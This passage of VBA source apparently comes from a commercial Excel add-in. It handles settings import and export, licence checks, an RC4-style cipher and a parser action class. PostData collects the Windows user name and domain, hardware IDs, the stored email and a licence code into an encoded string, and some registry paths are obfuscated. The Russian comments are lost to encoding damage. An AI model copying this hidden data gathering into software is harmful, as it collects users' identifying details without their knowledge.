        Case ok1 And ok2: a = IIf(d1 > d2, 1, IIf(d1 < d2, 2, 0))
        Case ok1: a = 1
        Case ok2: a = 2
        Case Else: a = 3
    End Select
    If a = 1 Then SF GetRegValue(U("64617461")) Else If a = 2 Then SetRegValue U("64617461"), SF
    If a = 3 Then SF "": WSP 1, ""
End Function

Function ImportFromFile(ByVal xmlPath$, Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim XML As Object, rootnode As Object, XMLoptions As Object, XMLoption As Object, AddinName$, AddinVersion$, msg$
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        If Not .Load(xmlPath) Then
            If Not HideMessages Then MsgBox tt("ErrorLoadingSettings"), vbCritical, tt("UnsupportedSettingsFile")
            Exit Function
        End If

        Set rootnode = .DocumentElement
        AddinName$ = rootnode.Attributes.getNamedItem("Addin").text
        AddinVersion$ = Val(rootnode.SelectSingleNode("Version").text)

        Select Case True

            Case rootnode.BaseName <> "Settings", AddinName$ = ""
                If Not HideMessages Then MsgBox tt("ErrorLoadingSettings"), vbCritical, tt("UnsupportedSettingsFile")
                Exit Function

            Case AddinName$ <> PROJECT_NAME$
                If Not HideMessages Then MsgBox tt("SettingsForAnotherAddinFound", AddinName$, PROJECT_NAME$), vbCritical, tt("UnsupportedSettingsFile")
                Exit Function

            Case Else
                Set XMLoptions = rootnode.SelectNodes("./Options/option")
                If XMLoptions.Length = 0 Then
                    If Not HideMessages Then MsgBox tt("SettingsNotFoundInSettingsFile"), vbExclamation, tt("AddinSettingsNotChanged")
                    Exit Function
                End If

                Dim nNEW&, nOLD&, nCHANGED&, nALL&, nERR&, param_name$, param_value$, v$, i&

                nALL& = XMLoptions.Length
                For Each XMLoption In XMLoptions
                    param_name$ = XMLoption.Attributes.getNamedItem("Name").text
                    param_value$ = XMLoption.Attributes.getNamedItem("Value").text
                    If Len(param_value$) Mod 2 = 0 Then
                        v$ = "": For i = 1 To Len(param_value$) / 2
                            v$ = v$ & Chr(Val("&H" & Mid(param_value$, 2 * i - 1, 2)))
                        Next
                        Select Case GetText(param_name$, NULLCHAR$)
                            Case NULLCHAR$: nNEW& = nNEW& + 1
                            Case v$: nOLD& = nOLD& + 1
                            Case Else: nCHANGED& = nCHANGED& + 1
                        End Select
                        SetText param_name$, v$
                    Else
                        nERR& = nERR& + 1
                    End If
                Next

                msg$ = tt("SettingsImportDone_MessageText", nALL&, nNEW&, nCHANGED&, nOLD&, nERR&)
                If GetVersion < Val(AddinVersion$) And Val(AddinVersion$) > 0 Then
                    msg$ = msg$ & vbNewLine & vbNewLine & tt("SettingsImport_DifferentVersions", GetVersionTXT(AddinVersion$), GetVersionTXT)
                End If
                If Not HideMessages Then MsgBox msg, vbInformation, tt("SettingsImportDone_MessageTitle", PROJECT_NAME$)
                ImportFromFile = True
        End Select
    End With
End Function

Private Function BASE_REGISTRY_PATH$()
    BASE_REGISTRY_PATH$ = ChrW(72) & ChrW(75) & ChrW(67) & ChrW(85) & ChrW(92) & ChrW(83) & ChrW(111) & ChrW(102) & _
                          ChrW(116) & ChrW(119) & ChrW(97) & ChrW(114) & ChrW(101) & ChrW(92) & ChrW(69) & ChrW(120) & _
                          ChrW(99) & ChrW(101) & ChrW(108) & ChrW(86) & ChrW(66) & ChrW(65) & ChrW(92) & PROJECT_NAME$ & "\"
End Function

Function ExportToFile(ByVal xmlPath$, Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim XML As Object, rootnode As Object, arr As Variant, msg$, i&, j&, v$, HelpMsg$, AboutMsg$
    Set XML = CreateObject("Microsoft.XMLDOM")

    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")

        Set rootnode = .appendChild(.createElement("Settings"))
        rootnode.Attributes.setNamedItem(.createAttribute("Addin")).text = PROJECT_NAME$
        rootnode.Attributes.setNamedItem(.createAttribute("VersionName")).text = GetVersionTXT
        rootnode.Attributes.setNamedItem(.createAttribute("Timestamp")).text = Now

        AboutMsg$ = PROJECT_NAME$ & " add-in for MS Excel. |fffd| " & _
                    Replace(ProgramYears, " - ", "-") & " Igor Vakhnenko" & vbNewLine & Split(PROGRAM_HYPERLINK$, "?")(0)
        rootnode.appendChild(.createComment("About")).text = AboutMsg$
        rootnode.appendChild(.createElement("Version")).text = GetVersion
        rootnode.appendChild(.createElement("Filename")).text = ThisWorkbook.Name

        HelpMsg$ = "All the values in this XML are stored as a HEX representation of the text data." & vbNewLine & _
                   "Each character of the value is converted into 2 characters, using the Hex(Asc(<character>)) function." & vbNewLine & _
                   "Please change program options using user interface only! (do not edit this XML file manually)" & vbNewLine & _
                   "These settings are stored in the registry: HKEY_CURRENT_USER\Software\VB and VBA Program Settings\" & PROJECT_NAME$ & "\Settings"

        If IsArray(arr) Then
            With rootnode.appendChild(XML.createElement("Options"))
                .appendChild(XML.createComment("Help")).text = HelpMsg$
                For i = LBound(arr) To UBound(arr)
                    v$ = ""
                    For j = 1 To Len(arr(i, 1))
                        v$ = v$ & IIf(Len(Hex(Asc(Mid(arr(i, 1), j, 1)))) = 1, "0", "") & Hex(Asc(Mid(arr(i, 1), j, 1)))
                    Next j

                    If Left(arr(i, 0), 1) <> "_" Then
                        With .appendChild(XML.createElement("option"))
                            .Attributes.setNamedItem(XML.createAttribute("Name")).text = arr(i, 0)
                            .Attributes.setNamedItem(XML.createAttribute("Value")).text = v$
                        End With
                    End If
                Next i
            End With
        Else
            If Not HideMessages Then MsgBox tt("SettingsExport_Unsaved", PROJECT_NAME$), vbExclamation, tt("SettingsExportErrorTitle")
            Exit Function
        End If

        Err.Clear: .Save xmlPath
        If Err Then
            If Not HideMessages Then MsgBox tt("SettingsExport_FilenameError", PROJECT_NAME$), vbExclamation, tt("SettingsExportErrorTitle")
        Else
            ExportToFile = True
            If Not HideMessages Then
                MsgBox tt("SettingsExportDone_MessageText", PROJECT_NAME$, Dir(xmlPath, vbNormal), Left(xmlPath, InStrRev(xmlPath, "\"))), _
                       vbInformation, tt("SettingsExportDone_MessageTitle")
            End If
        End If
    End With
End Function

Private Function CheckSum(ByRef txt) As String
    On Error Resume Next: Dim i&, s&
    For i& = 1 To Len(txt)
        s = (s + (2 + i Mod 10) * (AscW(Mid(txt, i, 1)) Mod 100)) Mod 10000
    Next
    CheckSum = Right(Hex(s), 3): If Len(CheckSum) < 3 Then CheckSum = String(3 - Len(CheckSum), "0") & CheckSum
End Function

Function DTU(Optional ByVal dd As Variant) As Long
    On Error Resume Next: If IsMissing(dd) Then dd = Now
    DTU = DateDiff("s", DateSerial(1970, 1, 1), CDate(dd))
End Function
Function DFU(Optional ByVal dd As Long) As Date
    On Error Resume Next: DFU = DateAdd("s", dd, DateSerial(1970, 1, 1))
End Function

Function PostData() As String
    On Error Resume Next:     Dim Sarr As Variant, i&, Extra$
    Sarr = GetAllSettings(PROJECT_NAME$, "Info")
    For i& = LBound(Sarr, 1) To UBound(Sarr, 1)
        If Len(Sarr(i&, 0)) Then Extra$ = Extra$ & "&" & Sarr(i&, 0) & "=" & Sarr(i&, 1)
    Next i&
    With CreateObject("WScript.Network"): PostData = PostData & "w=" & H(.UserName & "|" & .UserDomain): End With
    PostData = PostData & "&lang=" & GetLanguage & "&addin=" & PROJECT_NAME$ & "&HID=" & HID
    PostData = PostData & "&code=" & GetRegValue("code") & "&email=" & H(GetRegValue("email")) & "&upd=" & IIf(GetBoolean("AutoInstall", False, "Updates"), 1, 0)
    PostData = PostData & "&len=" & FileLen(ThisWorkbook.FullName) & "&ul=" & CIU & "&as=" & AS_ & "&HWID=" & HWID
    PostData = PostData & "&time=" & DTU & "|" & RSP(1) & "|" & RSP(2) & "|" & RSP(3) & "|" & LastMacro + 1
    PostData = PostData & "&info=" & Val(Application.Version) & "|" & OfficeBits & "|" & GetVersion & "&dev=" & GetText("", , U("484B43555C536F6674776172655C457863656C5642415C"))
    PostData = PostData & Extra$
End Function

Function H(ByVal txt$) As String
    On Error Resume Next: Dim i&, r&
    For i = 1 To Len(txt)
        r = Asc(Mid(txt, i, 1)): H = H & IIf(Len(Hex(r)) = 1, "0", "") & Hex(r)
    Next
End Function

Function LastMacro(Optional ByVal macroname$ = "") As Boolean
    On Error Resume Next: Dim rk$: rk$ = U("484B43555C536F6674776172655C4D6963726F736F66745C4F66666963655C457863656C5C4D6163726F5C")
    If Len(macroname$) Then SetText H(PROJECT_NAME$), H(macroname$), rk$ Else LastMacro = GetText(H(PROJECT_NAME$), , rk$) <> ""
End Function

Function k() As String
    On Error Resume Next: Dim txt$, s&, d&, i&, txt2$: txt2$ = HWID & "123": txt$ = PROJECT_NAME$ & txt2
    For i = 1 To Len(txt): s = s + Asc(Mid(txt, i, 1)) * i: Next
    For i = 1 To Len(txt2): d = d + Asc(Mid(txt2, i, 1)) * (10 ^ (i Mod 3)): Next
    k = Right(d, 4) & Format((s + 1234) Mod 1000, "000")
End Function

Private Function EnDeCrypt(ByVal txt$, Optional ByVal numeric As Boolean, Optional ByVal p$)        'As String
    On Error Resume Next
    Dim s(0 To 255) As Integer, kep(0 To 255) As Integer: If Len(p) = 0 Then p = "12345asdfg"
    Dim temp As Integer, a As Integer, b As Integer, sd As Long, i As Integer, j As Integer, temp2 As Integer, k As Integer
    b = 0
    For a = 0 To 255
        b = b + 1: If b > Len(p) Then b = 1
        kep(a) = Asc(Mid$(p, b, 1))
    Next a
    For a = 0 To 255: s(a) = a: Next a
    b = 0: For a = 0 To 255: b = (b + s(a) + kep(a)) Mod 256: temp = s(a): s(a) = s(b): s(b) = temp: Next a
    For a = 1 To Len(txt)
        i = (i + 1) Mod 256: j = (j + s(i)) Mod 256: temp = s(i): s(i) = s(j): s(j) = temp
        k = s((s(i) + s(j)) Mod 256)
        EnDeCrypt = EnDeCrypt & Chr(Asc(Mid$(txt, a, 1)) Xor k)
        sd = sd + CLng(Asc(Mid$(txt, a, 1))) * CLng(k + 6)
    Next
    If numeric Then EnDeCrypt = sd
End Function

Function Reset() As String
    On Error Resume Next
    Dim SettingsBackupFile$: SettingsBackupFile$ = FWF.temp_filename & "_SettingsBackup.xml"
    Me.ExportToFile SettingsBackupFile$, True
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings
    Reset = SettingsBackupFile$
End Function
Attribute VB_Name = "ArrayAction"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ArrayAction
' Author        : Igor Vakhnenko            Date: 17.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text
Option Explicit

Const XML_NODE_NAME$ = "Action"
Public Index As Long

Public Name As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Enabled As Boolean
Public Codename As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| XML
Public Description As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public HasManual As Boolean    ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Public Comment As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

Public Enum FUNCTION_CATEGORIES
    fc_HTML = 2            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML
    fc_Text = 4            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    fc_EncodeAndFormat = 6    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    fc_Check = 7           ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    fc_Another = 8         ' |fffd||fffd||fffd||fffd||fffd||fffd|
    fc_Variable = 9        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    fc_Array = 10          ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    fc_Numbers = 11        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    fc_Workbook = 12       ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    fc_Files = 14          ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
    
    fc_WinHTTP = 16        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTP
    fc_IE = 17             ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE
    
    fc_ParserOptions = 21        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    fc_WebQuery_XML_Macro = 22   ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, XML |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    fc_Developer = 29            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    fc_UNUSED = 31               ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    
    fc_Plugins = 50        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
End Enum

Public Category As FUNCTION_CATEGORIES        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Source As String    ' |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public parameters As New Collection        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| ArrayActionParameter
Public Parent As ArrayActions

Private Sub Class_Initialize()
    Me.Enabled = True
End Sub

Private Sub Class_Terminate()
    Set parameters = Nothing
    Set Parent = Nothing
End Sub

Function GetParametersInfo() As String
    On Error Resume Next
    Dim param As ArrayActionParameter, txt$
    For Each param In Me.parameters
        txt = txt & IIf(Len(txt), "; ", "") & param.Name & "=""" & param.value & """"
    Next
    If Trim(Me.Comment) <> "" Then txt = "|fffd|  " & txt
    GetParametersInfo = txt
End Function

Function GetParameterNamesList() As String
    On Error Resume Next
    Dim param As ArrayActionParameter, txt$, n&
    For Each param In Me.parameters
        n& = n& + 1
        txt = txt & IIf(Len(txt), ";" & Chr(160) & Chr(160) & Chr(160), "") & n & ": " & param.Description
    Next
    If txt = "" Then txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    GetParameterNamesList = txt
End Function

Function MoveUp() As ArrayAction
    On Error Resume Next: Dim res
    If Parent Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| MoveUp": Exit Function
    If Me.Index <= 1 Then Set MoveUp = Me: Exit Function
    
    Set MoveUp = Me
    Err.Clear: Parent.Items.Add MoveUp, , Me.Index - 1
    If Err = 0 Then res = Parent.DeleteAction(Me.Index + 1)
End Function

Function MoveDown() As ArrayAction
    On Error Resume Next
    If Parent Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| MoveDown": Exit Function
    If Parent.Items.Count <= Me.Index Then Set MoveDown = Me: Exit Function
    
    Parent.GetActionByIndex(Me.Index + 1).MoveUp        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set MoveDown = Parent.GetActionByIndex(Me.Index)
End Function

Sub ClearParameters()
    With Me
        .Name = DEFAULT_ACTION_NAME$
        .Codename = DEFAULT_ACTION_NAME$
        .Description = ""
        .Enabled = True
        Set .parameters = New Collection
    End With
End Sub

Function ApplyTo(ByRef txt$) As Long
    On Error Resume Next
    Dim ParametersDictionary As New Dictionary, param As ArrayActionParameter, param_text$
    Dim res As Variant, MacroFunctionName$, IsArrayAction As Boolean, n As Long
    For Each param In Me.parameters
        param_text$ = Render(param.value)
        ParametersDictionary.Add param.Name, param_text$
    Next
    
    With Me
        If .Enabled Then
            If .Codename Like "+*" Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                MacroFunctionName$ = "PluginAction_" & Mid(.Codename, 2)
                IsArrayAction = Right(.Codename, 6) = "_ARRAY"
                
                If IsArrayAction Then
                    ApplyTo = ApplyPluginArrayAction(txt$, MacroFunctionName$, ParametersDictionary)
                Else
                    ApplyTo = ApplyPluginNormalAction(txt$, MacroFunctionName$, ParametersDictionary)
                End If
                
            Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If .Category = fc_Array Then
                    ApplyTo = ApplyArrayActionToText(txt$, .Codename, ParametersDictionary, Me.Parent.ParentParser)
                Else
                    ApplyTo = ApplyNormalActionToText(txt$, .Codename, ParametersDictionary, Me.Parent.ParentParser)
                End If
            End If
        End If
    End With
    
    ParametersDictionary.RemoveAll
    CTick& = GetTickCount
    Set param = Nothing
    Set ParametersDictionary = Nothing
End Function

Function GetParametersDictionary() As Dictionary        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Set GetParametersDictionary = New Dictionary
    Dim param As ArrayActionParameter, param_text$
    For Each param In Me.parameters
        param_text$ = Render(param.value)
        GetParametersDictionary.Add param.Name, param_text$
    Next
End Function

Function ExportToXML() As IXMLDOMElement
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        node.Attributes.setNamedItem(.createAttribute("CodeName")).text = Me.Codename
        node.Attributes.setNamedItem(.createAttribute("Enabled")).text = Abs(CInt(Me.Enabled))
        If Len(Me.Source) Then node.Attributes.setNamedItem(.createAttribute("Source")).text = Me.Source
        If Len(Me.Comment) Then node.appendChild(XML.createComment("Comment")).text = Me.Comment
        
        Dim paramNode As IXMLDOMElement, param As ArrayActionParameter
        For Each param In Me.parameters
            Set paramNode = .createElement("Parameter")
            paramNode.Attributes.setNamedItem(.createAttribute("name")).text = param.Name
            paramNode.Attributes.setNamedItem(.createAttribute("value")).text = param.value
            node.appendChild paramNode
        Next
    End With
    
    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "node.baseName <> """ & XML_NODE_NAME$ & """"
        Exit Sub
    End If
    
    Dim param As IXMLDOMElement, ParamName$, p As ArrayActionParameter
    Me.Codename = Trim(node.Attributes.getNamedItem("CodeName").text)
    Me.Source = Trim(node.Attributes.getNamedItem("Source").text)
    Me.Comment = node.SelectSingleNode("comment()").text
    
    If Not Me.LoadParameters(Me.Codename) Then
        If Me.Codename Like "+*" Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Me.Source = Trim(node.Attributes.getNamedItem("Source").text)
            Me.Name = Mid(Me.Codename, 2) & " - |fffd||fffd||fffd||fffd||fffd||fffd| " & Me.Source
            Me.Category = 0
            
            Set Me.parameters = New Collection
            
            For Each param In node.SelectNodes("Parameter")
                ParamName$ = param.Attributes.getNamedItem("name").text
                Me.AddParameter ParamName$, aps_Locked, ParamName$
            Next
            Me.Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Source & "|fffd|"
        End If
    End If
    
    For Each param In node.SelectNodes("Parameter")
        ParamName$ = param.Attributes.getNamedItem("name").text
        Set p = Nothing: Set p = Me.parameters(ParamName$)
        If Not p Is Nothing Then
            Me.parameters(ParamName$).value = param.Attributes.getNamedItem("value").text
        Else
            If ParamName$ Like "param[12]" Then
                Me.parameters(Val(Mid(ParamName$, 6, 1))).value = param.Attributes.getNamedItem("value").text
            End If
        End If
    Next
    Me.Enabled = CBool(Val(node.Attributes.getNamedItem("Enabled").text))
End Sub


Function LoadParameters(Optional ByVal FunctionCodeName$) As Boolean
    On Error Resume Next
    If FunctionCodeName$ = "" Then FunctionCodeName$ = Me.Codename
    
    Dim aa As ArrayAction, AAP As ArrayActionParameter, OldParametersValues As Collection
    For Each aa In All_AAs(False).Items         ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| true |fffd||fffd| false
        If aa.Codename = FunctionCodeName$ Then
            Me.Name = aa.Name: Me.Codename = aa.Codename: Me.Category = aa.Category: Me.Source = aa.Source
            Set OldParametersValues = Me.parameters
            Set Me.parameters = New Collection        ' AA.Parameters
            
            For Each AAP In aa.parameters
                Me.AddParameter AAP.Name, AAP.Style, AAP.Description, AAP.OptionsList, AAP.DefaultValue, AAP.ExtendedRender
            Next
            
            For Each AAP In OldParametersValues
                Me.parameters(AAP.Name).value = AAP.value
            Next
            
            Me.Description = aa.Description
            Me.HasManual = aa.HasManual
            LoadParameters = True: Exit Function
        End If
    Next
    
    ' Me.Enabled = False
    If Me.Description = "" Then Me.Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Function

Function AddParameter(ByVal Name$, Optional ByVal Style As ActionParameterStyles, Optional ByVal Description$, _
        Optional ByVal OptionsList, Optional ByVal DefaultValue$, _
        Optional ExtendedRender As Boolean = False) As ArrayActionParameter
    Set AddParameter = New ArrayActionParameter
    With AddParameter
        .Name = Name$
        .Description = Description$
        .OptionsList = OptionsList
        .DefaultValue = DefaultValue$
        .value = DefaultValue$
        .Style = Style
        .ExtendedRender = ExtendedRender
    End With
    Me.parameters.Add AddParameter, Name$
End Function

Function PublishHTML_GetActionHTMLRow(ByRef OutputValue$, Optional ByVal RowType& = 0) As String
    On Error Resume Next
    Dim par As ArrayActionParameter, n&, txt$, action_name$, result_column$, par_value$, par_class$, par_name$, pos&
    
    If Me.parameters.Count Then
        n = 0
        For Each par In Me.parameters
            n = n + 1: action_name$ = "": result_column$ = ""
            If n = 1 Then
                action_name$ = vbTab & vbTab & "<td rowspan=""" & Me.parameters.Count & """ class=""action-name"">" & Me.Name & "</td>" & vbNewLine
                result_column$ = vbTab & vbTab & "<td rowspan=""" & Me.parameters.Count & """ class=""result-value""><!--noindex-->" & OutputValue$ & "<!--/noindex--></td>" & vbNewLine
            End If
            
            par_value$ = "<!--noindex-->" & Replace(Replace(par.value, ">", "&gt;"), "<", "&lt;") & "<!--/noindex-->"
            par_class$ = IIf(par.value = "", " parameter-blank", "")
            par_name$ = par.Description: pos& = InStrRev(par.Description, "(") - 1
            If pos& > 0 Then par_name$ = Trim(Left(par.Description, pos&))
            par_name$ = Replace(par_name$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "InnerHTML / OuterHTML")
            
            txt = txt & vbTab & "<tr class=""row-type-" & RowType& & """>" & vbNewLine & action_name$ & vbTab & vbTab & "<td class=""parameter-name" & par_class$ & """>" & _
